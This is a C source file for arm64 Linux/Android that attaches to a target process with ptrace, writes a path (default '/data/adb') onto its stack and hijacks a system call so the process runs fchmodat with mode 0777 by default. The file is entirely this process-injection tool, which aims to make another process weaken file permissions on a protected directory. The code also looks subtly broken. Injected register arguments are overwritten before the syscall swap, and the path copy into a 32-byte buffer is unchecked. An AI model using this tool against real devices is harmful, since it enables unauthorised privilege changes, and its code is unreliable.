#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef NT_PRSTATUS
#define NT_PRSTATUS 1
#endif
#ifndef PTRACE_GETREGSET
#define PTRACE_GETREGSET 0x4204
#endif
#ifndef PTRACE_SETREGSET
#define PTRACE_SETREGSET 0x4205
#endif

static int poke64(pid_t pid, uint64_t addr, uint64_t val) {
  errno = 0;
  long r = ptrace(PTRACE_POKEDATA, pid, (void *)addr, (void *)val);
  return (r == -1 && errno) ? -1 : 0;
}

static void sys_one(pid_t pid, struct user_pt_regs *r, int nr) {
  int st = 0;
  ptrace(PTRACE_SYSCALL, pid, 0, 0);
  waitpid(pid, &st, 0);
  struct iovec iov = {.iov_base = r, .iov_len = sizeof(*r)};
  ptrace(PTRACE_GETREGSET, pid, (void *)(long)NT_PRSTATUS, &iov);
  r->regs[8] = (uint64_t)nr;
  iov.iov_len = sizeof(*r);
  ptrace(PTRACE_SETREGSET, pid, (void *)(long)NT_PRSTATUS, &iov);
  struct iovec i2 = {.iov_base = &nr, .iov_len = sizeof(nr)};
  ptrace(PTRACE_SETREGSET, pid, (void *)(long)0x404, &i2);
  ptrace(PTRACE_SYSCALL, pid, 0, 0);
  waitpid(pid, &st, 0);
  iov.iov_len = sizeof(*r);
  ptrace(PTRACE_GETREGSET, pid, (void *)(long)NT_PRSTATUS, &iov);
}

int main(int argc, char **argv) {
  pid_t pid = (pid_t)atoi(argv[1]);
  const char *path = argc > 2 ? argv[2] : "/data/adb";
  int mode = argc > 3 ? (int)strtol(argv[3], NULL, 8) : 0777;
  if (ptrace(PTRACE_ATTACH, pid, 0, 0) != 0) {
    printf("ATTACH errno=%d\n", errno);
    return 1;
  }
  int st = 0;
  waitpid(pid, &st, 0);
  struct user_pt_regs r;
  memset(&r, 0, sizeof(r));
  struct iovec iov = {.iov_base = &r, .iov_len = sizeof(r)};
  ptrace(PTRACE_GETREGSET, pid, (void *)(long)NT_PRSTATUS, &iov);
  uint64_t dst = (r.sp - 0x100) & ~0xfULL;
  uint64_t w[4] = {0};
  memcpy(w, path, strlen(path) + 1);
  poke64(pid, dst, w[0]);
  poke64(pid, dst + 8, w[1]);
  poke64(pid, dst + 16, w[2]);
  poke64(pid, dst + 24, w[3]);
  ptrace(PTRACE_SETOPTIONS, pid, 0, (void *)PTRACE_O_TRACESYSGOOD);
  /* fchmodat(AT_FDCWD, path, mode, 0) = 53 */
  ptrace(PTRACE_SYSCALL, pid, 0, 0);
  waitpid(pid, &st, 0);
  iov.iov_len = sizeof(r);
  ptrace(PTRACE_GETREGSET, pid, (void *)(long)NT_PRSTATUS, &iov);
  r.regs[0] = (uint64_t)(int)-100;
  r.regs[1] = dst;
  r.regs[2] = (uint64_t)mode;
  r.regs[3] = 0;
  sys_one(pid, &r, 53);
  printf("fchmodat %s mode=%o x0=%lld\n", path, mode, (long long)r.regs[0]);
  ptrace(PTRACE_DETACH, pid, 0, 0);
  return 0;
}
